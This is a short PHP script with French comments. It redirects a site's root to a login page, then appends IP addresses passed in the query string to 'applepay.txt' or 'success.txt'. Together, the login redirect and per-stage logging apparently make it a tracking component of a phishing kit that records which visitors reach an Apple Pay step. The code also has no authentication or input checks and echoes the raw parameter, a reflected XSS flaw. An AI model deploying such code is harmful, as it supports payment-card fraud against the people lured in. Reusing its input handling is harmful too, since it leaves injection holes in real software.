<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<?php
// Vérifier la présence des paramètres "ip" et "action"
if (!isset($_GET['ip']) || !isset($_GET['action'])) {
    die("Paramètres manquants. Usage: ?ip=xxx.xxx.xxx.xxx&action=applepay|success");
}

$ip     = $_GET['ip'];
$action = $_GET['action'];

// Choisir le fichier texte selon "action"
switch ($action) {
    case 'applepay':
        // Le fichier se trouvera dans le même dossier que query.php
        $filename = __DIR__ . '/applepay.txt';
        break;
    case 'success':
        $filename = __DIR__ . '/success.txt';
        break;
    default:
        die("Action inconnue (seulement applepay ou success).");
}

// Créer le fichier s'il n'existe pas encore
if (!file_exists($filename)) {
    touch($filename); // Crée un fichier vide
}

// Écrire l'IP en fin de fichier (avec un retour à la ligne)
file_put_contents($filename, $ip . PHP_EOL, FILE_APPEND);

// Afficher un message de confirmation
echo "OK, IP $ip ajoutée dans " . basename($filename);
?>
